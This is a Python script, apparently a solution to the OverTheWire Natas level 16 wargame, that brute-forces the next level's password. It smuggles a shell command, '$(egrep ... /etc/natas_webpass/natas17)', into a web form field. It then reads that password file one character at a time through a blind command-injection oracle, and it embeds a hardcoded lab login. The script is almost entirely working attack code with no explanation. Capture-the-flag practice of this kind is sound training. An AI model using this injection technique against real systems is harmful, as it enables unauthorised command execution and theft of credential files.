import requests


MAX_SIZE = 64

chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
natas_user = "natas16"
natas_password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
password = ""

for x in range(MAX_SIZE):
    for y in chars:
        temp = password + y
        payload = {'needle': "doomed$(egrep ^{} /etc/natas_webpass/natas17)".format(temp)}
        req = requests.post("http://natas16.natas.labs.overthewire.org/", 
            auth = (natas_user, natas_password),
            data = payload,
            )
        if "doom" in req.text:
            continue
        else:
            password = temp
            print("Current password: {}".format(password))
                
